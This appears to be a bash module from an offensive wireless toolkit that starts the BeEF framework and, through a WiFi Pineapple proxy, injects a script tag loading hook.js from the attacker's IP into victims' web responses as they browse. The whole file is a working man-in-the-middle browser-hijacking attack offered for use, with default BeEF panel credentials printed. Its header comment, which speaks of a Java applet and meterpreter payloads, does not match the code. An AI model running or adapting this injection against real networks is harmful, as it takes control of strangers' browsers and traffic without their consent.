#
# Inject OS-Agnostic Java Applet into 
# victims web sessions while they surf.
# - Contains powershell injection meterpreter, a
#   custom windows payload, osx shell, and *nix shell
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="[Inject] BeEF Hook Injector"
# Create a description for menu
description="BeEF Javascript Browser Hook"
# Letter keys/commands to select item in menu
bindings='H|h'
#########################################

# Variables

# Start Function
function start_beefhook(){
  echo -e "\e[01;34m[>]\e[00m Running BeEF Javascript Hook Injection Attack..."  

  # Start up BeEf
  echo -e "\e[01;34m[>]\e[00m Starting up Beef..."  
  terminator -e "cd /opt/beef ; ruby beef" > /dev/null 2>&1 &
  pid_beef=$(echo $!)
  
  # This is our HTML that inejcts our BeEF hook into the browser reponses
  hook_data='<meta http-equiv="cache-control" content="no-cache" /><script src=\"http://'${our_ip}':3000/hook.js\" type=\"text/javascript\"></script>'
  echo -e "\e[01;34m[>]\e[00m Injecting BeEF Hook: ${hook_data}"  
   
   # Start up code injector for beef injection
  command="killall -9 python ; echo ${our_ip} > /pineapple/components/infusions/strip-n-inject/includes/proxy/attacker_ip.txt ; echo \"${hook_data}\" > /pineapple/components/infusions/strip-n-inject/includes/proxy/injection.txt ; cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash start.sh"
  pineapple_command
 
#   x-www-browser "http://127.0.0.1:3000/ui/panel" > /dev/null 2>&1 &
  
  echo -e "\n\n\e[01;34m[>]\e[00m Access BeEf in your browser at: http://127.0.0.1:3000/ui/panel\n\e[01;34m[>]\e[00m [USERNAME]: beef\n\e[01;34m[>]\e[00m [PASSWORD]: beef"
}

# Stop Function
function stop_beefhook(){
  echo -e "\e[01;34m[>]\e[00m Stopping BeEF Javascript Hook Injection Attack..."  
  kill -9 ${pid_beef} > /dev/null 2>&1
  command="cd /pineapple/components/infusions/strip-n-inject/includes/ ; bash stop.sh"
  pineapple_command
}
